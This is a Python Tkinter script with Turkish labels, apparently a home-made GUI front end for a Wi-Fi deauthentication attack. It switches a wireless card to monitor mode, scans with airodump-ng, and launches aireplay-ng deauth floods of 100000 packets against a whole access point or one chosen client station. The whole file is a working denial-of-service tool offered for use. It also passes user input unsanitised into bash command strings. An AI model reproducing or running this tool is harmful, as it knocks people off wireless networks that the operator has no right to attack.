from tkinter import *
from tkinter import messagebox, ttk
import subprocess

pencere1 = Tk()
pencere1.geometry("600x600+300+0")
pencere1.title("Deauth Saldırısı")

entr1 = None
entr2 = None

def arayuz():
    def monitor():
        global entr1, entr2
        arayuz1 = combo1.get()
        if arayuz1:
            try:
                result = subprocess.run(["sudo", "airmon-ng", "start", arayuz1], capture_output=True, text=True, check=True)
                if result.returncode == 0:
                    def detay():
                        def full():
                            subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f"sudo aireplay-ng --deauth 100000  -a {bssid} {arayuz1}; exec bash"])
                        def tekil():
                            def saldır():
                                c=entr11.get()
                                subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f"sudo aireplay-ng --deauth 100000  -a {bssid} -c {c} {arayuz1}; exec bash"])
                            label11=Label(pencere1,text="hedef station giriniz")
                            label11.pack()
                            entr11=Entry(pencere1)
                            entr11.pack()
                            nuton1=Button(pencere1,text="saldırmak için tıkla",command=saldır)
                            nuton1.pack()
                        global entr1, entr2
                        channel = entr1.get()
                        bssid = entr2.get()
                        subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f"sudo airodump-ng --channel {channel} --bssid {bssid} {arayuz1}; exec bash"])

                        buton11=Button(pencere1,text="TÜM AĞA SALDIR",command=full)
                        buton11.pack()
                        buton12=Button(pencere1,text="TEKİL HEDEFE SALDIR",command=tekil)
                        buton12.pack()

                    messagebox.showinfo("Başarılı", f"{arayuz1} başarıyla monitor moduna geçirildi.\n\n{result.stdout}")
                    print("deger", arayuz1)
                    # Yeni terminalde airodump-ng komutunu çalıştırma
                    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f"sudo airodump-ng {arayuz1}; exec bash"])
                    label3 = Label(pencere1, text="channel giriniz")
                    label3.pack()
                    deger = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12","13"]
                    entr1 = ttk.Combobox(pencere1, values=deger)
                    entr1.pack()
                    label4 = Label(pencere1, text="bssid giriniz")
                    label4.pack()
                    entr2 = Entry(pencere1)
                    entr2.pack()
                    buton3 = Button(pencere1, text="detaylar için tıklayınız", command=detay)
                    buton3.pack()
                else:
                    messagebox.showerror("Hata", f"Monitor moduna geçiş sırasında bir hata oluştu.\n\n{result.stderr}")
            except subprocess.CalledProcessError as e:
                messagebox.showerror("Hata", f"Monitor moduna geçiş sırasında bir hata oluştu.\n\n{e.stderr}")
        else:
            messagebox.showwarning("Uyarı", "Lütfen bir arayüz seçin.")

    try:
        interface1 = subprocess.run(["ifconfig"], capture_output=True, text=True, check=True)
        interface1 = interface1.stdout
        arayuzler = []
        lines = interface1.split('\n')
        for line in lines:
            if 'flags' in line:
                arayuz_ad = line.split(':')[0]
                arayuzler.append(arayuz_ad)
        if arayuzler:
            combo1 = ttk.Combobox(pencere1, values=arayuzler)
            combo1.pack()
            label1 = Label(pencere1, text="Monitör moda geçmek için tıklayınız")
            label1.pack()
            buton1 = Button(pencere1, text="TIKLA", command=monitor)
            buton1.pack()
        else:
            messagebox.showwarning("Uyarı", "Hiçbir ağ arayüzü bulunamadı.")
    except subprocess.CalledProcessError as e:
        messagebox.showerror("Hata", f"Arayüz bilgilerini çekerken bir hata oluştu.\n\n{e.stderr}")

label2 = Label(pencere1, text="Monitor moda geçecek olan arayüzü seçiniz")
label2.pack()
buton2 = Button(pencere1, text="Arayüzleri görmek için tıklayınız", command=arayuz)
buton2.pack()

pencere1.mainloop()
